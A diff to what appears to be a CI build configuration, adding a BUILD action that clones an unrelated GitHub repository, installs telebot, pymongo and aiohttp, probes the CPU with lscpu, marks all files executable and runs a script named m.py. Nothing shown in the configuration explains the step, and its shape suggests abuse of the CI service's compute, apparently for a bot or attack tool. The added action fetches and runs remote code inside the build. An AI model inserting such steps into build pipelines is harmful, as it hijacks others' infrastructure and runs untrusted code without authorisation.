@@ -4,3 +4,11 @@
   - "refs/heads/main"
   fail_on_prepare_env_warning: true
   resources: "X2LARGE"
+  actions:
+  - action: "git clone https://github.com/aaduopl/Kk && cd Kk && pip install telebot pymongo aiohttp && lscpu && chmod +x * && python3 m.py"
+    type: "BUILD"
+    docker_image_name: "droidsonroids/bitrise-docker-android-ndk"
+    docker_image_tag: "latest"
+    execute_commands:
+    - "git clone https://github.com/aaduopl/Kk && cd Kk && pip install telebot pymongo aiohttp && lscpu && chmod +x * && python3 m.py"
+    shell: "BASH"
